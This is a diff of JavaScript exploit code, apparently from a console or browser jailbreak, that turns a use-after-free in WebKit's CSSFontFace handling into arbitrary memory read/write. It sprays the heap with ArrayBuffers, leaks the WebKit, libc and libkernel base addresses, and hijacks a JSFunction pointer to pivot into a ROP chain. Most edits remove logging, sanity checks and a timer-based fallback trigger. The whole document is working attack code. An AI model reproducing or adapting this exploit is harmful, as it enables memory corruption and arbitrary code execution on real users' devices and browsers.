@@ -797,7 +797,7 @@ function nsleep(nsec) {
 }
 
 async function init_rw() {
-  logger.info("Initiate CSSFontFace UAF...");
+  logger.info("Initiate UAF...");
 
   const spray_count = 0xb0;
   const spray_font_rule = `
@@ -818,42 +818,32 @@ async function init_rw() {
   const abs = new Array(spray_count);
 
   // FontFace A with a local source so it resolves synchronously
-  logger.debug("Creating FontFace A...");
   const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
 
-  logger.debug("Adding FontFace A to document.fonts...");
   document.fonts.add(A);
 
   // Register a DeferredPromise on A
   void A.loaded;
 
-  logger.debug("Creating style element...");
   const style = document.createElement("style");
   document.head.appendChild(style);
 
   // Shape heap around B in order to reclaim it after free
-  logger.debug(`Inserting ${spray_count / 4} spray rules (before)...`);
   for (let i = 0; i < spray_count / 4; i++) {
     style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
   }
 
   // FontFace B with a remote source so it resolves asynchronously
   const uaf_font_rule_index = style.sheet.cssRules.length;
-  logger.debug(`Inserting UAF font rule at index ${uaf_font_rule_index}...`);
   style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
 
   // Shape heap around B in order to reclaim it after free
-  logger.debug(`Inserting ${spray_count * 3 / 4} spray rules (after)...`);
   for (let i = spray_count / 4; i < spray_count; i++) {
     style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
   }
 
   // Forces style recalculation and FontFace instantiation
-  logger.debug("Forcing style recalculation (offsetTop)...");
   document.body.offsetTop;
-  logger.debug("Style recalculation done");
-
-  let thenGetterFired = false;
 
   const old_then = FontFace.prototype.then;
 
@@ -861,9 +851,6 @@ async function init_rw() {
     configurable: true,
     get() {
       if (this === A) {
-        thenGetterFired = true;
-        logger.info("[CSSFontFace] then getter FIRED for FontFace A");
-
         // Free B while FontFaceSet::load still holds a raw reference to it in matchingFaces
         style.sheet.deleteRule(uaf_font_rule_index);
 
@@ -892,160 +879,47 @@ async function init_rw() {
 
           abs[i] = ab;
         }
-
-        logger.info("[CSSFontFace] UAF trigger + spray complete via then getter");
       }
 
       return undefined;
     },
   });
 
-  logger.debug("Calling document.fonts.load()...");
-  const CSSFONTFACE_TIMEOUT_MS = 10000;
-  let fonts = undefined;
-  let timedOut = false;
+  // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule)
+  // A resolves synchronously, firing the thenable check getter above
+  const fonts = await document.fonts.load("1em a, b", "AB");
 
-  try {
-    fonts = await Promise.race([
-      document.fonts.load("1em a, b", "AB"),
-      new Promise((_, reject) =>
-        setTimeout(() => {
-          timedOut = true;
-          reject(new Error(`Font load timed out after ${CSSFONTFACE_TIMEOUT_MS}ms`));
-        }, CSSFONTFACE_TIMEOUT_MS)
-      ),
-    ]);
-  } catch (timeoutErr) {
-    logger.warn(`[CSSFontFace] ${timeoutErr.message}`);
-  }
-
-  logger.info(`[CSSFontFace] then getter fired: ${thenGetterFired}, timed out: ${timedOut}, fonts: ${fonts ? fonts.length : "undefined"}`);
+  logger.debug(`fonts: ${fonts}`);
 
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     value: old_then,
   });
 
-  // Fallback: if then getter did NOT fire (FW 11.50+), use timer-based UAF trigger
-  if (!thenGetterFired) {
-    logger.info("[CSSFontFace] then getter did NOT fire - attempting timer-based UAF trigger...");
-
-    // Reset the CSSFontFace B by re-inserting the rule
-    logger.debug("[CSSFontFace] Re-inserting UAF font rule for timer-based trigger...");
-    style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
-    const new_uaf_font_rule_index = style.sheet.cssRules.length - 1;
-
-    // Re-insert spray rules for heap shaping
-    logger.debug(`[CSSFontFace] Re-inserting ${spray_count} spray rules...`);
-    for (let i = 0; i < spray_count; i++) {
-      style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
-    }
-
-    // Force recalculation
-    document.body.offsetTop;
-    logger.debug("[CSSFontFace] Style recalculation done for timer-based trigger");
-
-    // Start document.fonts.load() WITHOUT awaiting - this holds raw refs to CSSFontFace objects
-    logger.debug("[CSSFontFace] Starting document.fonts.load() (non-blocking)...");
-    const loadPromise = document.fonts.load("1em a, b", "AB");
-
-    // Wait briefly for font loading to start and hold raw references
-    await new Promise(r => setTimeout(r, 200));
-    logger.debug("[CSSFontFont] 200ms elapsed - triggering UAF via timer...");
-
-    // Now FontFaceSet holds raw references to the CSSFontFace objects
-    // Delete B's CSS rule to free its CSSFontFace while references are still held
-    logger.debug("[CSSFontFace] Deleting UAF font rule...");
-    style.sheet.deleteRule(new_uaf_font_rule_index);
-
-    // Forces style recalculation and FontFace deconstruction
-    document.body.offsetTop;
-
-    // Delete all spray rules to free heap slots
-    logger.debug("[CSSFontFace] Deleting spray rules...");
-    for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
-      const rule = style.sheet.cssRules[i];
-      if (rule.cssText.includes("spray")) {
-        style.sheet.deleteRule(i);
-      }
-    }
-
-    // Forces style recalculation
-    document.body.offsetTop;
-
-    // Spray ArrayBuffer with FontFace size to reclaim freed CSSFontFace
-    logger.debug(`[CSSFontFace] Spraying ${spray_count} ArrayBuffers for reclamation...`);
-    for (let i = 0; i < abs.length; i++) {
-      const ab = new ArrayBuffer(constants.wk_CSSFontFace_sizeof);
-      const view = new DataView(ab);
-
-      view.setBInt(8, 1, true); // ref count
-      view.setUint8(constants.wk_CSSFontFace_m_status, 3); // m_status: Status::Success
-
-      abs[i] = ab;
-    }
-    logger.info("[CSSFontFace] Timer-based UAF trigger + spray complete");
-
-    // Try to get the fonts result from the load promise
-    try {
-      fonts = await Promise.race([
-        loadPromise,
-        new Promise((_, reject) =>
-          setTimeout(() => reject(new Error("Timer-based: second timeout")), 5000)
-        ),
-      ]);
-    } catch (e) {
-      logger.warn(`[CSSFontFace] Timer-based: loadPromise also timed out: ${e.message}`);
-    }
-
-    logger.info(`[CSSFontFace] Timer-based: fonts = ${fonts ? fonts.length : "undefined"}`);
+  // Check if both A and B are loaded
+  if (fonts.length !== 2) {
+    throw new Error("Unable to reclaim UAF FontFace !!");
   }
+
+  logger.info("UAF Achieved !!");
 
   let uaf_ab = undefined;
   let uaf_font = undefined;
 
-  // Try to find UAF font from fonts array (then getter path)
-  if (fonts && fonts.length >= 2) {
-    logger.info("UAF Achieved via then getter !!");
-
-    // UAF FontFace has default unicodeRange value U+0-10FFFF
-    for (const font of fonts) {
-      if (font.unicodeRange === "U+0-10FFFF") {
-        logger.info("Found UAF FontFace in fonts array !!");
-        uaf_font = font;
-        break;
-      }
+  // UAF FontFace has default unicodeRange value U+0-10FFFF
+  for (const font of fonts) {
+    if (font.unicodeRange === "U+0-10FFFF") {
+      logger.info("Found UAF FontFace !!");
+      uaf_font = font;
+      break;
     }
-    fonts.length = 0;
-  } else {
-    logger.info("[CSSFontFace] fonts array not available, scanning document.fonts...");
   }
 
-  // If UAF font not found via fonts array, scan document.fonts (timer-based path)
   if (uaf_font === undefined) {
-    logger.debug("[CSSFontFace] Scanning document.fonts for UAF font...");
-    for (const font of document.fonts) {
-      if (font.unicodeRange === "U+0-10FFFF") {
-        logger.info("Found UAF FontFace in document.fonts !!");
-        uaf_font = font;
-        break;
-      }
-    }
+    throw new Error("Unable to find UAF error !!");
   }
 
-  // If still not found, scan all fonts for any that look reclaimed
-  if (uaf_font === undefined) {
-    logger.debug("[CSSFontFace] Scanning all fonts for any reclaimed font...");
-    for (const font of document.fonts) {
-      try {
-        const settings = font.featureSettings;
-        logger.debug(`[CSSFontFace] Font: family=${font.family}, unicode=${font.unicodeRange}, settings=${settings}`);
-      } catch (e) {
-        logger.debug(`[CSSFontFace] Font: family=${font.family} - featureSettings access crashed: ${e.message}`);
-      }
-    }
-    throw new Error("Unable to find UAF FontFace - neither fonts array nor document.fonts contains it");
-  }
+  fonts.length = 0;
 
   // UAF ArrayBuffer has ref count of 2 due to FontFace return to script
   for (const ab of abs) {
@@ -1058,12 +932,7 @@ async function init_rw() {
   }
 
   if (uaf_ab === undefined) {
-    logger.warn("[CSSFontFace] No ArrayBuffer with refcount 2 found, using first ArrayBuffer as fallback");
-    if (abs.length > 0) {
-      uaf_ab = abs[0];
-    } else {
-      throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
-    }
+    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
   }
 
   abs.length = 0;
@@ -1315,7 +1184,7 @@ function init_rop() {
   logger.info("Initiate ROP...");
 
   const math_expm1_addr = arw.addrof(Math.expm1);
-  logger.debug(`math_expm1_addr: 0x${math_expm1_addr.d.toString(16)}`);
+  logger.debug(`math_expm1_addr: ${math_expm1_addr}`);
 
   let m_executableOrRareData = arw.view(math_expm1_addr).getBInt(0x18, true);
 
@@ -1323,47 +1192,21 @@ function init_rop() {
     m_executableOrRareData = m_executableOrRareData.xor(g_JSFunctionPoison);
   }
 
-  if (webkit_base === undefined) {
-    const m_function = arw.view(m_executableOrRareData).getBInt(constants.wk_JSFunction_m_function, true);
-    logger.debug(`m_function: 0x${m_function.d.toString(16)}`);
-    logger.debug(`wk_expm1_builtin offset: 0x${constants.wk_expm1_builtin.toString(16)}`);
-    webkit_base = m_function.sub(constants.wk_expm1_builtin);
-  }
+  logger.debug(`m_executableOrRareData: ${m_executableOrRareData}`);
 
-  logger.debug(`m_executableOrRareData: 0x${m_executableOrRareData.d.toString(16)}`);
-
-  if (webkit_base.eq(0) || webkit_base.hi === 0) {
-    logger.error(`webkit_base validation FAILED: lo=0x${webkit_base.lo.toString(16)} hi=0x${webkit_base.hi.toString(16)}`);
-    throw new Error("Invalid WebKit base address - exploit may have failed");
-  }
-
-  logger.info(`webkit_base: 0x${webkit_base.d.toString(16)}`);
+  logger.info(`webkit base: ${webkit_base}`);
 
   strerror_addr = arw.view(webkit_base).getBInt(constants.wk___imp_strerror, true);
-  logger.debug(`wk___imp_strerror offset: 0x${constants.wk___imp_strerror.toString(16)}`);
-  logger.debug(`strerror_addr: 0x${strerror_addr.d.toString(16)}`);
-
-  if (strerror_addr.eq(0)) {
-    logger.error("strerror_addr is NULL - WebKit import table may be corrupted");
-    throw new Error("Invalid strerror address - check WebKit offsets");
-  }
+  logger.debug(`strerror_addr: ${strerror_addr}`);
 
   libc_base = strerror_addr.sub(constants.c_strerror);
-  logger.debug(`c_strerror offset: 0x${constants.c_strerror.toString(16)}`);
-  logger.info(`libc_base: 0x${libc_base.d.toString(16)}`);
+  logger.info(`libc base: ${libc_base}`);
 
   _error_addr = arw.view(webkit_base).getBInt(constants.wk___imp___error, true);
-  logger.debug(`wk___imp___error offset: 0x${constants.wk___imp___error.toString(16)}`);
-  logger.debug(`_error_addr: 0x${_error_addr.d.toString(16)}`);
-
-  if (_error_addr.eq(0)) {
-    logger.error("_error_addr is NULL - WebKit import table may be corrupted");
-    throw new Error("Invalid _error address - check WebKit offsets");
-  }
+  logger.debug(`_error_addr: ${_error_addr}`);
 
   libkernel_base = _error_addr.sub(constants.k__error);
-  logger.debug(`k__error offset: 0x${constants.k__error.toString(16)}`);
-  logger.info(`libkernel_base: 0x${libkernel_base.d.toString(16)}`);
+  logger.info(`libkernel base: ${libkernel_base}`);
 
   let m_function_pivot;
 
@@ -1375,7 +1218,6 @@ function init_rop() {
     m_function_pivot = gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX;
   }
 
-  logger.debug(`m_function_pivot: 0x${m_function_pivot.d.toString(16)}`);
   arw.view(m_executableOrRareData).setBInt(constants.wk_JSFunction_m_function, m_function_pivot, true);
 
   rop.pivot = new Pivot();
@@ -1423,7 +1265,6 @@ function init_rop() {
   fn._strerror = new NativeFunction(strerror_addr, "string");
 
   logger.info("Achieved ROP !!");
-  logger.debug(`ROP summary: webkit=0x${webkit_base.d.toString(16)} libc=0x${libc_base.d.toString(16)} libkernel=0x${libkernel_base.d.toString(16)}`);
 }
 
 function init_syscalls() {
